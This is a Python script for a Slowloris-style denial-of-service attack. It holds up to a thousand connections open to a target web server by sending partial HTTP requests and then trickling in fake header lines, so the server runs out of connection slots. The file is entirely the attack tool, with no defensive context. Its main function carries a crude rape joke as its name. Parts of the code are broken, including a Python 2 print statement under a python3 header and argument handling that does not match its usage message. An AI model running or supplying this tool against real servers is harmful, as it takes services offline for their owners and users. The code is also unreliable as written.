#!/usr/bin/python3
import socket
from sys import argv
from time import sleep
from threading import Thread
from random import random

"""Begin config type things"""
headers = ""
slowMessage = "X-a: b\r\n"
maxSocks = 1000
"""End config type things"""

#List full of socks
sockList = list()

#Number of failed connection attempts
failedAttempts = 0

#tell thread to exit
threadDie = False

#Generate our properly formatted headers
def getHeaders():
    hcopy = ["GET /{} HTTP/1.1".format(random())] + headers
    return "\r\n".join(hcopy)

#generate a single socket connection, send the initial header stuff, and add to sockList
def generateSocket(target, port):
    global failedAttempts
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((target,port))
        sock.send(getHeaders().encode('utf-8'))
        sock.send(slowMessage.encode('utf-8'))
        sockList.append(sock)
    except Exception as e:
        print("Connection failed: {}".format(e))
        failedAttempts = failedAttempts + 1
        if failedAttempts >= 3:
            print('Failed 3 connection attempts, aborting')
            
        else:
            sleep(3)

#Dat Class is filled with Dem Socks (Thread that continues to add sockets to the list until we reach our limit
class demSocks(Thread):
    def __init__(self, target, port):
        Thread.__init__(self)
        self.target = target
        self.port = port
        self.count = 1
    def run(self):
        global threadDie
        try:
            while True:
            
                while len(sockList) < maxSocks:
                    generateSocket(self.target, self.port)
                    self.count = self.count + 1
                    if self.count >= 10:
                        print("{} sockets connected".format(len(sockList)))
                        self.count = 0
                    if threadDie:
                        raise KeyboardInterrupt
        except KeyboardInterrupt:
            for s in sockList:
                s.close()
        

def raep(target, port):
    global threadDie
    global failedAttempts

    t = demSocks(target, port)
    t.start()
    try:
        sleep(10)
        print("Waiting for 10 seconds")
        while True:
            sentTo = 0
            count = 0
            for s in sockList:
                if failedAttempts >= 3:
                    break
                try:
                    s.send(slowMessage.encode('utf-8'))
                    sentTo = sentTo + 1
                except Exception as e:
                    print("Removing Socket {}".format(count))
                    del sockList[count]
                    count = count - 1
                count = count + 1
                
            print("Send data to {} sockets".format(sentTo))
            sleep(50)
    except KeyboardInterrupt:
        print("Recieved Keyboard Interrupt, exiting")
    threadDie = True
    t.join()

if __name__ == "__main__":
    if len(argv) < 2:
        print("Usage: python slow_helix.py target")
        exit()
    target = argv[1]
    port = argv[2]
    host = argv[3]
    host_header = "Host: "+str(host)
    headers = [host_header, "Accept: text/plain", "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64)"]
    print headers
    raep(target, int(port))
